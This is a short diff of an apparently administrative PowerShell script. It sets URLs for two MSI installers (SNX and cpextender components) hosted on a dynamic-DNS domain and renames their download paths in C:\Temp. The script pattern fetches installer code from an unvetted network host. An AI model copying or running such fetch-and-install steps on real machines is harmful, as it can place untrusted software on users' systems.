@@ -30,7 +30,7 @@ catch {
 ##extradownloads:
 $MsiUrl = "https://ibktangaalt.ydns.eu/upload/data/SNXComponentsShell.msi"
 $TempFolderPath = "C:\Temp"
-$MsiPath = "$TempFolderPath\extender.cab"
+$MsiPath = "$TempFolderPath\SNXComponentsShell.msi"
 # Load Powershell
 Write-Host "Attempting to load file from $MsiUrl to $MsiPath"
 if (-not(Test-Path $MsiPath)) {
@@ -50,7 +50,7 @@ catch {
 }
 $MsiUrl = "https://ibktangaalt.ydns.eu/upload/data/cpextender.msi"
 $TempFolderPath = "C:\Temp"
-$MsiPath = "$TempFolderPath\SNX.cab"
+$MsiPath = "$TempFolderPath\cpextender.msi"
 # Load Powershell
 Write-Host "Attempting to load file from $MsiUrl to $MsiPath"
 if (-not(Test-Path $MsiPath)) {
